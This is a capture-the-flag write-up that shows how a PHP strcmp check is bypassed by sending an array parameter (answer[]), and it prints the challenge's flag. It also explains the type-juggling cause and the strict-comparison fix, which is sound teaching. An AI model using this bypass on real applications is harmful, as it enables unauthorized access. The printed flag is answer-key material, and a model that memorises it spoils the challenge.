# Loose Comparison Flag Bypass

## Summary
Submit an answer to get the flag by exploiting a PHP loose comparison vulnerability.

## Steps

1. View the page source and notice the link:
   ```
   <a style="color: white" href="?source">View Sauce</a>
   ```
2. Open the source code via the `?source` URL:
   ```
   <?php  
       if(isset($_GET["answer"])){
           if(strcmp($answer , $_GET["answer"]) == 0){
               echo "<p>Correct! Here's your flag: {$flag}</p>";
           } else {
               echo "<p>Incorrect!</p>";
           }
       }
   ?>
   ```
3. Try submitting a random answer:
   ```
   https://skrctf.me/ports/xxx/index.php?answer=random
   ```
4. Modify the URL to:
   ```
   https://skrctf.me/ports/xxx/index.php?answer[]=
   ```
   **Note:** Submitting an array (`answer[]`) bypasses the strcmp check due to PHP's type juggling and loose comparison (`== 0`).  

5. The condition becomes true and the flag is revealed:
   ```
   SKR{D0n't_U5e_L00s3_C0mp4ris1On_18b4b9}
   ```

## Explanation
`strcmp()` returns `NULL` when comparing a string to an array, and `NULL == 0` evaluates to true in PHP with loose comparison (`==`). This allows bypassing the check by submitting an array instead of a string. Using strict comparison (`===`) would prevent this bypass.

---

This exploit highlights the dangers of loose comparison in PHP authentication checks.
